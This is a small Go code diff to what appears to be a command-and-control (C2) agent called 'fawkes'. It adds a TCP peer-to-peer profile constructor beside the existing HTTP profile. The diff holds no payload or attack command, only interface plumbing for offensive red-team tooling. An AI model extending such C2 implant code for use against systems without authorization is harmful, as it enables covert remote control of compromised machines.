@@ -3,6 +3,7 @@ package profiles
 import (
 	"fawkes/pkg/http"
 	"fawkes/pkg/structs"
+	"fawkes/pkg/tcp"
 )
 
 // Profile interface defines the C2 profile methods
@@ -15,4 +16,9 @@ type Profile interface {
 // NewProfile creates a new profile based on the HTTP profile
 func NewProfile(httpProfile *http.HTTPProfile) Profile {
 	return httpProfile
+}
+
+// NewTCPProfile creates a new profile based on the TCP P2P profile
+func NewTCPProfile(tcpProfile *tcp.TCPProfile) Profile {
+	return tcpProfile
 }
